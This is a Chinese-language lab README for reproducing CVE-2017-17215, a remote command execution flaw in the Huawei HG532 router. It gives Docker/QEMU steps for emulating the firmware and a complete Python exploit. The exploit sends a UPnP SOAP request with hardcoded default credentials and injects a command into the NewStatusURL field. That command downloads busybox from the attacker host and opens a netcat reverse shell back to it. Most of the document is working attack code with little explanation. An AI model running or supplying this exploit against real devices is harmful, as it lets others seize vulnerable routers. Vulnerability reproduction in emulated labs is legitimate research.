# 华为 HG532 远程命令执行漏洞


## 漏洞环境

```sh
# 拉取 binwalk 并解包固件
$ docker pull firmianay/binwalk
$ docker run -v $PWD/firmware:/root/firmware firmianay/binwalk -Mer /root/firmware/HG532eV100R001C02B015.zip

# 先构建漏洞环境 qemu-system:mips 环境
$ cd baseImage/qemu-system/mips
$ docker build -t qemu-system:mips .

# 再构建漏洞环境（在此之前先把 busybox-mips, gdbserver 等复制到 tools 目录）
# cp baseImage/busybox/1.31.0/busybox-mips CVE-2017-17215/system-emu/tools/
# cp baseImage/gdbserver/7.11.1/mips-gdbserver-7.11.1 CVE-2017-17215/system-emu/tools/gdbserver
$ docker-compose -f docker-compose-system.yml build

# 启动环境
$ docker-compose -f docker-compose-system.yml up
# 等待启动完成，重新开启一个窗口做后续操作
$ docker exec -it huawei-system /bin/bash

# 本地监听 1234 端口
$ nc -lvp 1234

# 重开一个窗口运行 exp，即可获得 shell
$ python3 tools/exp.py
```

## 漏洞复现

```py
#!/usr/bin/python
import threading, requests
from requests.auth import HTTPDigestAuth

cmd = "busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox-mips ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 1234 -e /bin/sh"
data = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

class exploit(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        try:
            print("cmd: " + cmd)
            url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
            requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=data)
        except Exception as e:
            print(e)

n = exploit('192.168.2.2')
n.start()
```

![img](./exp.png)


## 参考链接

- https://research.checkpoint.com/2017/good-zero-day-skiddie/
- https://www.freebuf.com/vuls/160040.html
